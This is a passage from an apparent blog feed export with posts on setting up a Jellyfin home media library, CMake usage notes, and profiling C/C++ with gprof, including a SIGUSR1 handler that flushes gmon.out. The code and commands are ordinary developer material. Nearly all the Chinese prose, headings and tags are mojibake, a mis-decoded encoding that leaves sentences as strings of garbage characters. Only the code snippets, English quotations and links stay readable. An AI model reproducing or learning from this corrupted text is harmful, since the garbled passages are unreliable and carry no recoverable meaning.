alt="image-20240318111144919"></p><p>æœ€è¿‘ä¹Ÿåœ¨çŠ¹è±«æ˜¯ä¸æ˜¯åœ¨æä¸€ä¸ª16Tçš„ç¡¬ç›˜ï¼Œç„¶åæŠŠè¿™ä¸¤ä¸ªç¡¬ç›˜é‡Œçš„æ•°æ®æ‹·è´åˆ°æ–°ç¡¬ç›˜é‡Œï¼Œç„¶åé‡æ–°æ•´ç†ï¼ŒæŠŠè¿™ä¸¤ä¸ªç¡¬ç›˜åšä¸€ä¸ªRAID0ï¼Œå˜æˆ8Tçš„ç¡¬ç›˜ã€‚è„‘å­é‡Œæœ€è¿‘ä¸€ç›´åœ¨æ‰“ç®—è¿™ä¸ªäº‹ã€‚</p><p>å…¶æ¬¡æˆ‘çš„PTåšç§ä¹Ÿåšäº†ä¸å°‘äº†ï¼Œåœ¨RSä¸Šä¹Ÿç®—å¯ä»¥è¯´æ˜¯å¤§ä½¬äº†å“ˆå“ˆï¼Œæ¯•ç«Ÿæ˜¯ç¬¬ä¸€ä¸ªè¾¾æˆNEXUX MASTERçš„å•¦ å“ˆå“ˆï¼Œå°å°å‚²å¨‡ä¸€ä¸‹</p><p><img src="https://s2.loli.net/2024/03/18/wuVOHqpKlMA2Lo6.png" class="lazyload" data-srcset="https://s2.loli.net/2024/03/18/wuVOHqpKlMA2Lo6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240318111706010"></p><img src="https://s2.loli.net/2024/03/18/yJKYR75jAvkxsSB.png" class="lazyload" data-srcset="https://s2.loli.net/2024/03/18/yJKYR75jAvkxsSB.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240318111632133" style="zoom:33%;" /></div><h2 id="æ‰€ç”¨åˆ°å·¥å…·">æ‰€ç”¨åˆ°å·¥å…·</h2><div class="story post-story"><ol><li>Jellyfin-windows   å½±ç‰‡åº“</li><li>tinymediamanager  èµ„æºä¿¡æ¯åˆ®å‰Šå™¨</li></ol><p>å®‰è£…Jellfinå è®¾ç½®åª’ä½“åº“è·¯å¾„ï¼Œä»¥åŠé…ç½®ç›¸å…³çš„é…ç½®ï¼Œè®¾ç½®ä»£ç†ï¼Œå…ƒæ•°æ®ä¿¡æ¯ç­‰</p><p>ç„¶åç”¨tinymediamanager æ¥è¿›è¡Œå½±è§†ä¿¡æ¯åˆ®å‰Šï¼ŒJellfinè‡ªå¸¦çš„åˆ®å‰Šå™¨ä¸€èˆ¬æƒ…å†µï¼Œæ‰€ä»¥ç”¨tinymediamanageræ¥æœç´¢</p><p>è®°å¾—æºé€‰æ‹©ï¼š<a href="http://thmoivedb.org">thmoivedb.org</a> å¯¹ä¸­æ–‡æ”¯æŒæ¯”è¾ƒå‹å¥½</p><p>å‚è€ƒè§†é¢‘ï¼š</p><p>ã€è¶…å®Œç¾æ•´ç†å®¶åº­å½±éŸ³èµ„æ–™åº“ï¼Œå®Œç¾é€‚é…Kodi, Emby, Jellyfin, Plexç­‰å®¶åº­å½±éŸ³è½¯ä»¶-By tinymediamanagerã€‘ <a href="https://www.bilibili.com/video/BV1DE41187FG/?share_source=copy_web&amp;vd_source=6953266e5edee58abf75e1a5445b51c2">https://www.bilibili.com/video/BV1DE41187FG/?share_source=copy_web&amp;vd_source=6953266e5edee58abf75e1a5445b51c2</a></p><p>ã€ã€ç”µè„‘/å½±è§†ã€‘ä»é›¶å¼€å§‹æ­å»ºå®¶åº­å½±éŸ³åº“ï¼Œè§£é”è§‚å½±æ–°å§¿åŠ¿ï¼Œä¸åªWindowsï¼Œå…¨å¹³å°é€‚é…ã€‚è¶…çº§è¯¦ç»†çš„jellyfiné…ç½®è§†é¢‘ã€‚ã€‘ <a href="https://www.bilibili.com/video/BV1hF411k7GV/?share_source=copy_web&amp;vd_source=6953266e5edee58abf75e1a5445b51c2">https://www.bilibili.com/video/BV1hF411k7GV/?share_source=copy_web&amp;vd_source=6953266e5edee58abf75e1a5445b51c2</a></p><p><img src="https://s2.loli.net/2024/03/18/WgrRhbxutipQ8VS.jpg" class="lazyload" data-srcset="https://s2.loli.net/2024/03/18/WgrRhbxutipQ8VS.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240318120515089"></p><p><img src="https://s2.loli.net/2024/03/18/P9zkFh3MinEJW2g.jpg" class="lazyload" data-srcset="https://s2.loli.net/2024/03/18/P9zkFh3MinEJW2g.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240318120725335"></p><p>æ’­æ”¾çš„è¯ï¼Œä½¿ç”¨Nvidiç¡¬ä»¶åŠ é€Ÿï¼Œä¹Ÿæ˜¯å¯ä»¥ç›´æ¥æ’­æ”¾çš„ï¼Œ</p><p>æœ¬åœ°ç›´æ¥è°ƒç”¨potplayerè¿›è¡Œæ’­æ”¾ï¼Œè¿œç¨‹çš„è¯ é€šè¿‡åœ¨çº¿æ’­æ”¾</p><p>æœ¬åœ°è°ƒç”¨potplayerå‚è€ƒï¼š <a href="http://www.potplayercn.com/course/3041.html">http://www.potplayercn.com/course/3041.html</a></p><p><a href="https://github.com/tccoin/Jellyfin-Potplayer">https://github.com/tccoin/Jellyfin-Potplayer</a></p></div><h2 id="æœ€ç»ˆæ•ˆæœ">æœ€ç»ˆæ•ˆæœ</h2><div class="story post-story"><p><img src="https://s2.loli.net/2024/03/18/FYI3mWZHMVDTCjp.png" class="lazyload" data-srcset="https://s2.loli.net/2024/03/18/FYI3mWZHMVDTCjp.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240318203945789"></p><p><img src="https://s2.loli.net/2024/03/18/nlaWX6eR5VpMF8s.png" class="lazyload" data-srcset="https://s2.loli.net/2024/03/18/nlaWX6eR5VpMF8s.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240318204121935"></p><p><img src="https://s2.loli.net/2024/03/18/oTqEQvfN7Yz3xrO.png" class="lazyload" data-srcset="https://s2.loli.net/2024/03/18/oTqEQvfN7Yz3xrO.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240318204237572"></p></div><h2 id="å†…ç½‘ç©¿é€">å†…ç½‘ç©¿é€</h2><div class="story post-story"><p>è‹¦äºæ²¡æœ‰å…¬ç½‘IPV4 IPV6</p><p>ä½¿ç”¨<code>zerotier one</code> æ¥è¿›è¡Œp2p å†…ç½‘ç©¿é€</p><ol><li>åˆ›å»ºä¸€ä¸ªç½‘ç»œ</li><li>å†…ç½‘è®¾å¤‡é€šè¿‡ç½‘ç»œIDåŠ å…¥è¿™ä¸ªç½‘ç»œ</li><li>å¤–ç½‘è®¾å¤‡é€šè¿‡ç½‘ç»œIDåŠ å…¥è¿™ä¸ªç½‘ç»œ</li><li>ç½‘é¡µç»™è®¾å¤‡æˆæƒ</li><li>ç„¶åç»„å»ºè™šæ‹Ÿå±€åŸŸç½‘è¿›è¡Œè®¿é—®</li></ol></div>]]></content>
      
      
      
        <tags>
            
            <tag> åª’ä½“åº“ </tag>
            
            <tag> æµåª’ä½“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cmake ä½¿ç”¨è¿‡ç¨‹ä¸­çš„ä¸€äº›è®°å½•</title>
      <link href="/posts/a49ee1f7/"/>
      <url>/posts/a49ee1f7/</url>
      
        <content type="html"><![CDATA[<h1>Cmake ä½¿ç”¨è¿‡ç¨‹ä¸­çš„ä¸€äº›è®°å½•</h1><h2 id="å†™åœ¨å‰é¢">å†™åœ¨å‰é¢</h2><div class="story post-story"><p>ç»ˆäºè¿˜æ˜¯ç”¨èµ·æ¥cmakeäº†ï¼Œ å…ˆå‰éƒ½æ˜¯æ‰‹æ’•makefilesï¼Œ ç›´æ¥ç”¨makefilesç¼–å†™é¡¹ç›®æ–‡ä»¶</p><p>ä½†ç»ˆå½’è¿˜æ˜¯å¤ªéº»çƒ¦ï¼Œéœ€è¦è€ƒè™‘å„ç§ä¾èµ–å…³ç³»ï¼Œå¯ä»¥è¯´æ˜¯äº‹æ— å·¨ç»†ï¼Œåæ¥è½¬åˆ°windowsä¸Šåšé¡¹ç›®å¼€å‘ï¼Œæ‰å‘ç°</p><p>cmakeç‰¹åˆ«å¥½ç”¨ï¼ŒçœŸçš„èƒ½çœå¾ˆå¤šäº‹</p></div><h2 id="å‚è€ƒ">å‚è€ƒ</h2><div class="story post-story"><p>ä¼˜é›…çš„æœ¬åœ°å¼€å‘ï¼Œè¿œç¨‹linuxç¯å¢ƒè°ƒè¯•ï¼ŒClionå†³ç»å­</p><p><a href="https://blog.csdn.net/jiuri1005/article/details/128431491">æœ¬åœ°clionå¼€å‘/ä¼˜é›…åœ°è°ƒè¯•ï¼Œå¹¶å®æ—¶åŒæ­¥è¿œç¨‹æœåŠ¡å™¨</a></p></div><h2 id="Cmake-Example">Cmake-Example</h2><div class="story post-story"><p><a href="https://github.com/sizaif/cmake-examples">cmake-examples</a></p><p>ä¸€ä¸ªéå¸¸å¥½çš„githubå¼€æºåº“ï¼Œä½œä¸ºcmakeåˆå­¦è€…éå¸¸é€‚ç”¨</p></div><h2 id="è®°å½•å¸¸ç”¨åˆ°çš„cmakeç”¨æ³•">è®°å½•å¸¸ç”¨åˆ°çš„cmakeç”¨æ³•</h2><div class="story post-story"><h3 id="include-directories">include_directories</h3><p>è®¾å®šæœ¬é¡¹ç›®å¼•å…¥çš„å¤´æ–‡ä»¶è·¯å¾„ï¼Œ<code>$&#123;PROJECT_SOURCES&#125;</code> å¯ä»¥é€šè¿‡<code>set()</code> æ¥è®¾ç½®ï¼›</p><pre class="language-none"><code class="language-none">include_directories($&#123;PROJECT_SOURCES&#125;&#x2F;include) </code></pre><p>å½“å¼•å…¥å¤´æ–‡ä»¶è·¯å¾„åï¼Œåœ¨é¡¹ç›®ç¼–å†™æ—¶å°±å¯ä»¥éå¸¸ä¼˜é›…çš„å¼•å…¥äº†</p><p>ä¾‹å¦‚ï¼š é¡¹ç›®ç»“æ„å¦‚ä¸‹</p><pre class="language-none"><code class="language-none">main-project:include:basic:headerA.hpro:plus:headerB.hsrc:main.cpp</code></pre><p>å‡è®¾<code>headerB</code>éœ€è¦å¼•å…¥<code>headerA.h</code>å¤´æ–‡ä»¶ï¼Œ ä¸€èˆ¬çš„å†™æ³•æ˜¯<code>include &quot;../../basic/headerA.h&quot;</code> è¿™ç§ç›¸å¯¹è·¯å¾„</p><p>å½“æˆ‘ä»¬è®¾ç½®<code>include_directories($&#123;main_project_path&#125;/include)</code>å</p><p>åªéœ€è¦åœ¨<code>headerB.h</code>ä¸­å†™<code>include &quot;basic/headerA.h&quot; </code>å°±å¯ä»¥äº†ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬æ‰¾åˆ°å¯¹äºçš„è·¯å¾„ä¸‹çš„æ–‡ä»¶</p><p>é‚£ä¹ˆåœ¨<code>main.cpp</code>ä¸­å¼•å…¥å¤´æ–‡ä»¶æ—¶</p><p>åªéœ€è¦ç¼–å†™:</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"basic/headerA.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"pro/plus/headerB.h"</span></span></code></pre><h3 id="target-link-libraries-ä¸-target-include-directories">target_link_libraries ä¸ target_include_directories</h3><p><code>target_link_libraries </code></p><p><code>target_include_directories</code></p><p>è¿™ä¸¤ä¸ªçš„ç”¨æ³•éƒ½æ˜¯åœ¨è®¾å®šç”Ÿæˆåº“æ–‡ä»¶æˆ–è€…å¯æ‰§è¡Œæ–‡ä»¶æ ‡è¯†ä¹‹åï¼š</p><p><code>add_library / add_executable</code></p><pre class="language-none"><code class="language-none"># ç¼–è¯‘ç”Ÿæˆé™æ€åº“&#x2F;åŠ¨æ€åº“add_library(&lt;name&gt; STATIC&#x2F;SHARED &lt;sourcefiles&gt;)# åº“çš„å¤´æ–‡ä»¶æœç´¢è·¯å¾„&#x2F; ä¾èµ–é¡¹# ç­‰ä»·äº makefileä¸­çš„ -L&#x2F;pathtarget_include_directories(&lt;name&gt; &lt;option&gt; &lt;path&gt;)target_link_libraries(&lt;name&gt; &lt;option&gt; &lt;deplibraries&gt;)</code></pre><blockquote><pre class="language-none"><code class="language-none">&gt;target_include_directories(target  [SYSTEM] [BEFORE]  &lt;INTERFACE|PUBLIC|PRIVATE&gt; [items1...]  [&lt;INTERFACE|PUBLIC|PRIVATE&gt; [items2...] ...])</code></pre><p>å…¶ä¸­ï¼Œ<code>target</code> æ˜¯ç›®æ ‡åç§°ï¼Œå¯ä»¥æ˜¯åº“æˆ–å¯æ‰§è¡Œæ–‡ä»¶çš„åç§°ã€‚<br><code>SYSTEM</code> è¡¨ç¤ºè¿™äº›å¤´æ–‡ä»¶æ˜¯ç³»ç»Ÿå¤´æ–‡ä»¶ï¼Œ<code>BEFORE</code> è¡¨ç¤ºè¿™äº›è·¯å¾„å°†è¢«æ·»åŠ åˆ°å…¶ä»–è·¯å¾„ä¹‹å‰ã€‚<code>INTERFACE</code>ã€<code>PUBLIC</code> å’Œ <code>PRIVATE</code> æ˜¯æŒ‡å®šè¿™äº›è·¯å¾„çš„å¯è§æ€§ã€‚å®ƒä»¬çš„å«ä¹‰å¦‚ä¸‹ï¼š</p><ul><li><code>INTERFACE</code>ï¼šè¿™äº›è·¯å¾„åªä¼šè¢«æ·»åŠ åˆ°ç›®æ ‡çš„æ¥å£ä¸­ï¼Œä¸ä¼šè¢«æ·»åŠ åˆ°ç›®æ ‡è‡ªèº«çš„ç¼–è¯‘é€‰é¡¹ä¸­ã€‚</li><li><code>PUBLIC</code>ï¼šè¿™äº›è·¯å¾„ä¼šè¢«æ·»åŠ åˆ°ç›®æ ‡è‡ªèº«çš„ç¼–è¯‘é€‰é¡¹ä¸­ï¼ŒåŒæ—¶ä¹Ÿä¼šè¢«æ·»åŠ åˆ°ç›®æ ‡çš„æ¥å£ä¸­ã€‚</li><li><code>PRIVATE</code>ï¼šè¿™äº›è·¯å¾„åªä¼šè¢«æ·»åŠ åˆ°ç›®æ ‡è‡ªèº«çš„ç¼–è¯‘é€‰é¡¹ä¸­ï¼Œä¸ä¼šè¢«æ·»åŠ åˆ°ç›®æ ‡çš„æ¥å£ä¸­ã€‚<br><code>items</code> æ˜¯å¤´æ–‡ä»¶æœç´¢è·¯å¾„ï¼Œå¯ä»¥æ˜¯ç»å¯¹è·¯å¾„æˆ–ç›¸å¯¹è·¯å¾„ã€‚å¦‚æœæ˜¯ç›¸å¯¹è·¯å¾„ï¼Œä¼šç›¸å¯¹äºå½“å‰ CMakeLists.txt æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•è¿›è¡Œè§£æã€‚</li></ul></blockquote><h3 id="Subject">Subject</h3><p>é¡¹ç›®ç»“æ„ï¼š</p><pre class="language-none"><code class="language-none">main_projectsub_project_A:project_A_filesCMakeLists.txtsub_project_B:    project_B_filesCMakeLists.txtCMakeLists.txt</code></pre><p><code>sub_projectA</code> ä¸<code>sub_projectB</code>éƒ½æ˜¯<code>main_project</code>çš„ä¾èµ–åº“</p><p>å…¶ä¸­<code>projectB</code>åˆä¾èµ–äº<code>projectA</code></p><p>åœ¨<code>main_project</code>ä¸‹çš„<code>CMakeLists.txt</code>ä¸­</p><p>å¯ä»¥é€šè¿‡ä¸€ä¸‹å‘½ä»¤ï¼Œç»™å­subjectä¼ å‚ï¼Œ ä»¥åŠæ·»åŠ å­é¡¹ç›®</p><pre class="language-none"><code class="language-none">set(PROJECT_SOURCES $&#123;CMAKE_CURRENT_SOURCE_DIR&#125;&#x2F;path&#x2F;to&#x2F;proejctA)add_subdirectory(path&#x2F;to&#x2F;project)</code></pre><p>åœ¨<code>sub_projectB</code>ä¸­é€šè¿‡ä¸»é¡¹ç›®çš„ä¼ å‚ï¼Œæ‹¿åˆ°<code>sub_projectA</code>çš„è·¯å¾„ï¼Œå°±å¯ä»¥</p><p>è®¾ç½®<code>include_directories</code> <code>target_link_libraries</code>  <code>target_include_directories</code> äº†</p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> Cmake </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C/C++ ä½¿ç”¨Gprofåˆ†æè¿è¡Œæ€§èƒ½æµ‹è¯•</title>
      <link href="/posts/8162d461/"/>
      <url>/posts/8162d461/</url>
      
        <content type="html"><![CDATA[<h1>å‰è¨€</h1><p>å¯¹äºC/C++ å¦‚æœæƒ³åˆ†ææŸä¸ªå‡½æ•°æµ‹è¯•ç”¨æ—¶æ—¶é—´ï¼Œä»¥åŠæƒ³ä»æ•´ä½“ä¸Šåˆ†æä»£ç æ•ˆç‡å¦‚ä½•ï¼Œå¯ä»¥ä½¿ç”¨gprofå·¥å…·æ¥è¿›è¡Œæµ‹è¯•ï¼Œå¹¶å¯è§†åŒ–ç”Ÿæˆæ¯ä¸ªå‡½æ•°æ¨¡å—çš„ç”¨æ—¶å æ¯”å›¾ã€‚</p><h1>GNU gprof</h1><h2 id="C-gprof-ä½¿ç”¨æ–¹æ³•">C++ gprof  ä½¿ç”¨æ–¹æ³•</h2><div class="story post-story"><p>1.ç¼–è¯‘ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">gcc -g -c myprog.c utils.c -pggcc -o myprog myprog.o utils.o -pgg++/clang++ -g mysrc.cpp -o myprogram -pg  <span class="token operator">&lt;</span>other arg<span class="token operator">></span></code></pre><p>The `-pgâ€™ option also works with a command that both compiles and links:</p><pre class="language-none"><code class="language-none">gcc&#x2F;clang -o myprog myprog.c utils.c -g -pg</code></pre><p>æ³¨æ„ï¼š</p><p>å¦‚æœä½¿ç”¨äº†clang-14 ä¹‹åçš„ç‰ˆæœ¬ ï¼Œ é»˜è®¤ä½¿ç”¨<code>DWARF V5</code>ç‰ˆæœ¬ï¼Œ è€Œ<code>gprof</code> åªæ”¯æŒåˆ°<code>DWARF V4</code></p><p>å°±ä¼šå‡ºç°ä¸€ä¸‹é”™è¯¯ï¼š</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">BFD<span class="token operator">:</span> DWARF error<span class="token operator">:</span> invalid <span class="token operator">or</span> unhandled FORM value<span class="token operator">:</span> <span class="token number">0x25</span></code></pre><p>è§£å†³æ–¹æ³•ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">ç¼–è¯‘æ—¶ä¿®æ”¹ -g ä¸º -gdwarf-4clang -o myprog myprog.c utils.c -gdwarf-4 -pg</code></pre><p>å¦‚æœä¸è¡Œï¼Œ å‚è€ƒï¼š<div class="tag link"><a class="link-card" title="Ubuntu ç¼–è¯‘å®‰è£… Binutils2.4ç‰ˆæœ¬" href="https://www.sizaif.com/posts/1b7755b0/"><div class="left"><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></div><div class="right"><p class="text">Ubuntu ç¼–è¯‘å®‰è£… Binutils2.4ç‰ˆæœ¬</p><p class="url">https://www.sizaif.com/posts/1b7755b0/</p></div></a></div></p><p>2.æ­£å¸¸æ‰§è¡Œç¨‹åº ç”Ÿæˆ <code>gmon.out</code></p><pre class="language-bash" data-language="bash"><code class="language-bash">./myprogram</code></pre><p>æ³¨æ„ï¼š<code>gprof</code> è¦æ±‚ç¨‹åºèƒ½å¤Ÿæ­£å¸¸ç»“æŸï¼Œ</p><blockquote><p>æ‚¨çš„ç¨‹åºå¿…é¡»æ­£å¸¸é€€å‡ºï¼šé€šè¿‡ä» main è¿”å›æˆ–è°ƒç”¨ exitã€‚ è°ƒç”¨ä½çº§å‡½æ•° _exit ä¸ä¼šå†™å…¥é…ç½®æ–‡ä»¶æ•°æ®ï¼Œä¹Ÿä¸ä¼šç”±äºæœªå¤„ç†çš„ä¿¡å·è€Œå¼‚å¸¸ç»ˆæ­¢ã€‚</p><p>In order to write the `gmon.outâ€™ file properly, your program must exit normally: by returning from main or by calling exit. Calling the low-level function _exit does not write the profile data, and neither does abnormal termination due to an unhandled signal.</p></blockquote></div><h2 id="å¦‚æœæƒ³ç”¨gprofæµ‹è¯•éœ€è¦CTRL-Cä¸­æ–­é€€å‡ºçš„ç¨‹åº">å¦‚æœæƒ³ç”¨gprofæµ‹è¯•éœ€è¦CTRL+Cä¸­æ–­é€€å‡ºçš„ç¨‹åº</h2><div class="story post-story"><p>å‰æ–‡æåˆ° <code>gprof </code>å¿…é¡»è¦æ±‚ç¨‹åºæ­£å¸¸é€€å‡ºï¼Œ è€Œ<code>CTRL+C </code>ä¸­æ–­ä¿¡å·ç­‰ ä¸èƒ½æ­£å¸¸ç”Ÿæˆ<code>gmon.out</code>æ–‡ä»¶ï¼Œ æ—¢ç„¶æ²¡æœ‰<code>gmon.out</code>æ–‡ä»¶ä¹Ÿå°±æ— æ³•åˆ†ææ€§èƒ½ï¼Œ</p><p>è°ƒç”¨<code>exit(0)</code> é’ˆå¯¹åƒ<code>CTRL+C</code> ä¸å¯è¡Œï¼Œ</p><p>ä½¿ç”¨<code>kill -15 PID</code> ä¹Ÿæ— æ³•ç”Ÿæˆ<code>gmon.out</code></p><p>è§£å†³æ–¹æ³•ï¼šå¤„ç†è‡ªå®šä¹‰ä¿¡å· <code>SIGUSR1</code></p><p>é’ˆå¯¹ç›®å‰ç¨‹åºæ’æ¡©ï¼Œ ä½¿å…¶è°ƒç”¨å¤–éƒ¨å‡½æ•°ï¼Œ å¤–éƒ¨å‡½æ•°ä¸­åŒ…å«å¦‚ä¸‹ä¿¡å·å¤„ç†ä»£ç ï¼š</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;dlfcn.h></span></span><span class="token keyword">void</span> <span class="token function">sigUsr1Handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment">// ç¨‹åºå…³é—­å‰ å¤„ç†å¿…è¦æ“ä½œ</span>            <span class="token comment">// å¤„ç† SIGUSR1 ä¿¡å·</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Received SIGUSR1 signal. Generating gmon.out file...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>_mcleanup<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    _mcleanup <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">dlsym</span><span class="token punctuation">(</span>RTLD_DEFAULT<span class="token punctuation">,</span> <span class="token string">"_mcleanup"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>_mcleanup <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>         <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Unable to find gprof exit hook\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token function">_mcleanup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// æ³¨å†Œä¿¡å·</span><span class="token function">signal</span><span class="token punctuation">(</span>SIGUSR1<span class="token punctuation">,</span> sigUsr1Handler<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ç¼–è¯‘å¤–éƒ¨ä¾èµ–åº“ï¼š</p><blockquote><p>è¿™é‡Œä½¿ç”¨ <code>-Wl,--no-as-needed -ldl </code>  æ¥è§£å†³ å¼•å…¥<code>dlsym</code> æœªå®šä¹‰çš„æƒ…å†µ</p><p>å‚è€ƒï¼š [<a href="https://stackoverflow.com/questions/10205543/saving-gmon-out-before-killing-a-process">Saving gmon.out before killing a process</a>](<a href="https://stackoverflow.com/questions/10205543/saving-gmon-out-before-killing-a-process">https://stackoverflow.com/questions/10205543/saving-gmon-out-before-killing-a-process</a>)</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#makefile</span><span class="token variable"><span class="token variable">$(</span>CXX<span class="token variable">)</span></span> <span class="token variable"><span class="token variable">$(</span>CXXFLAGS<span class="token variable">)</span></span> -g -Wl,--no-as-needed -ldl -pg -fPIC -shared  <span class="token variable"><span class="token variable">$(</span>SRC_PATH<span class="token variable">)</span></span>/src.cpp -o <span class="token variable"><span class="token variable">$(</span>LIB_PATH<span class="token variable">)</span></span>/libmycode.so</code></pre><blockquote><p>æœ€åå½“ç¨‹åºç»“æŸæ—¶ï¼Œä¼šè°ƒç”¨_mcleanupï¼Œå…¶å®šä¹‰åœ¨gmon/gmon.cä¸­ã€‚</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token operator">></span><span class="token keyword">void</span> <span class="token function">_mcleanup</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">&#123;</span> <span class="token function">__moncontrol</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>_gmonparam<span class="token punctuation">.</span>state <span class="token operator">!=</span> GMON_PROF_ERROR<span class="token punctuation">)</span>   <span class="token function">write_gmon</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* free the memory. */</span> <span class="token function">free</span> <span class="token punctuation">(</span>_gmonparam<span class="token punctuation">.</span>tos<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token punctuation">&#125;</span> </code></pre><p>é¦–å…ˆå…¶é€šè¿‡__moncontrolï¼ˆ0ï¼‰ç»“æŸprofilå·¥ä½œï¼Œå…¶æ¬¡é€šè¿‡write_gmon ()å‡½æ•°å°†profileä¿¡æ¯è¾“å‡ºåˆ°gmon.outæ–‡ä»¶ä¸­ã€‚</p></blockquote></div><h2 id="libåŠ¨æ€ä¾èµ–åº“-æµ‹è¯•ï¼Ÿ-gprofæ— æ³•æµ‹è¯•">libåŠ¨æ€ä¾èµ–åº“ æµ‹è¯•ï¼Ÿ - gprofæ— æ³•æµ‹è¯•</h2><div class="story post-story"><p><strong>gprof æ— æ³•åˆ†æåŠ¨æ€ä¾èµ–åº“</strong></p><p>åªèƒ½åˆ†æé™æ€å‡½æ•°</p><p>æ•…å†æµ‹è¯• openssl æ€§èƒ½ç“¶é¢ˆæ—¶ ï¼Œé™æ€ç¼–è¯‘</p><pre class="language-bash" data-language="bash"><code class="language-bash">./Configure --prefix<span class="token operator">=</span><span class="token variable">$prefix_static</span> <span class="token punctuation">\</span>no-shared <span class="token punctuation">\</span><span class="token string">'-L/home/workhome/llvm_test/llvm-tutorial-opt/work07/dev/lib -ltaintcpp.a'</span></code></pre><p>å¤–éƒ¨å‡½æ•°è°ƒç”¨<code>libtaintcpp.a</code>æ–‡ä»¶</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># makefile</span><span class="token variable"><span class="token variable">$(</span>AR<span class="token variable">)</span></span> -c rsc <span class="token variable"><span class="token variable">$(</span>LIB_PATH<span class="token variable">)</span></span>/libtaintcpp.a <span class="token variable"><span class="token variable">$(</span>LIB_PATH<span class="token variable">)</span></span>/util.o </code></pre><p>ç›®å‰é‡åˆ°çš„é—®é¢˜ï¼š</p><p>æµ‹è¯•<code>openssl</code> æ—¶ï¼Œ ç¼–è¯‘é™æ€<code>libssl.a,libcrypto.a</code> æ–‡ä»¶ é“¾æ¥åˆ°<code>openssl</code></p><p>ä½†æˆ‘çš„å¤–éƒ¨å‡½æ•°æ˜¯<code>C++</code>ï¼Œåº”ç”¨äº†<code>STL</code>åº“ä¸­å‡½æ•°ï¼Œ</p><p>Clang æ— æ³•é“¾æ¥é™æ€ç‰ˆæœ¬çš„<code>libstdc++.a</code>æ–‡ä»¶ï¼Œ åªèƒ½ä½¿ç”¨<code>-lstdc++</code>é“¾æ¥åŠ¨æ€ï¼Œ å¯¼è‡´é™æ€åŠ¨æ€æ··ç”¨</p><blockquote><p><a href="https://blog.csdn.net/giantchen547792075/article/details/12780675/">https://blog.csdn.net/giantchen547792075/article/details/12780675/</a></p><p>åœ¨è¿™ç‰‡æ–‡ç« ä¸­æåˆ° 